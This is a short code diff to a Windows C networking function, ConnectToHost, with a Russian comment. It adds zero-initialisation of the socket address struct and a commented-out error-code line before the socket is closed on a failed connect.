@@ -483,6 +483,8 @@ SOCKET ConnectToHost(PCHAR Host, int Port)
 
 	struct sockaddr_in SockAddr;
 
+	ClearStruct(SockAddr);
+
 	SockAddr.sin_family		 = AF_INET;
 	SockAddr.sin_addr.s_addr = **(unsigned long**)lpHost->h_addr_list;
 	SockAddr.sin_port		 = HTONS((unsigned short)Port );
@@ -490,6 +492,7 @@ SOCKET ConnectToHost(PCHAR Host, int Port)
 	// подключаемся к сокету
 	if ( (int)pconnect( Socket, (const struct sockaddr*)&SockAddr, sizeof( SockAddr ) ) == SOCKET_ERROR )
 	{
+		//int Error = WSAGetLastError();
 		pclosesocket( Socket );
 		return SOCKET_ERROR;
 	}
